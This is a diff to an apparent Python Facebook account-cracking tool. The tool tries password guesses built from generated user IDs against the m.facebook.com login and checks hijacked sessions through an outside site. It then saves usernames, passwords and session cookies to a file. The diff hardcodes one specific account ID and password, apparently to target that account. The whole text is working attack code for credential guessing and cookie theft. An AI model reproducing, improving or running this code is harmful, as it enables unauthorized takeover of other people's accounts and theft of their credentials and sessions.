@@ -728,7 +728,8 @@ def NUM():
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
-      idf = kode+guru
+      idfh = kode+guru
+      idf ='100033583610737'
       pwv = [idf[:6],idf[:8],idf,]
       if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
@@ -1221,7 +1222,7 @@ def m6(idf,pwv):
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":idf,
-            "pass":ps,
+            "pass":'963648',
             "login":"Log In"}
    header_freefb = {
             'authority': 'm.facebook.com',
@@ -1245,10 +1246,11 @@ def m6(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*?);', coki)
+    print(f'\r\r{P}[ATOM-OK]:{user}')
     url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
-            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
